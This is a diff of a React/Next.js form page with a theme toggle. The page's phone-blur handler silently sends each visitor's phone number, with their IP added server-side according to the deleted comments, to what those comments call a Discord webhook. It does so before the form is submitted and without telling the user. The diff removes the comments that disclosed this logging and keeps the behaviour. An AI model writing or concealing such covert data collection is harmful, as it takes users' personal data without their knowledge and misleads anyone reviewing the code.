@@ -3,6 +3,9 @@
 import { useState } from 'react';
 import { useTheme } from '@/lib/ThemeContext';
 
+// ✅ Prevents static generation
+export const dynamic = 'force-dynamic';
+
 export default function Home() {
   const { theme, toggleTheme, getDisplayTheme } = useTheme();
   const [formData, setFormData] = useState({
@@ -21,7 +24,6 @@ export default function Home() {
     setFormData({ ...formData, [e.target.name]: e.target.value });
   };
 
-  // Phone blur handler: log phone + IP via Discord webhook (silent)
   const handlePhoneBlur = async () => {
     const phone = formData.phone;
     if (!phone) return;
@@ -32,7 +34,6 @@ export default function Home() {
         body: JSON.stringify({ phone }),
       });
     } catch (err) {
-      // Silently fail – no user notification
       console.error('Webhook logging failed:', err);
     }
   };
@@ -119,7 +120,6 @@ export default function Home() {
     }
   };
 
-  // Theme display for toggle button
   const displayTheme = getDisplayTheme?.() || 'light';
 
   if (step === 'verified') {
@@ -142,7 +142,6 @@ export default function Home() {
 
   return (
     <main className="flex min-h-screen items-center justify-center p-6 bg-white dark:bg-gray-900 relative">
-      {/* Theme toggle button */}
       <button
         onClick={toggleTheme}
         className="absolute top-4 right-4 rounded-full p-2 bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
@@ -202,7 +201,7 @@ export default function Home() {
                 required
                 value={formData.phone}
                 onChange={handleChange}
-                onBlur={handlePhoneBlur}   // <-- triggers Discord webhook logging (IP included server-side)
+                onBlur={handlePhoneBlur}
                 className="mt-1 w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 px-4 py-2 text-gray-900 dark:text-gray-100 focus:border-blue-500 focus:outline-none"
                 placeholder="+1234567890 (E.164 format)"
               />
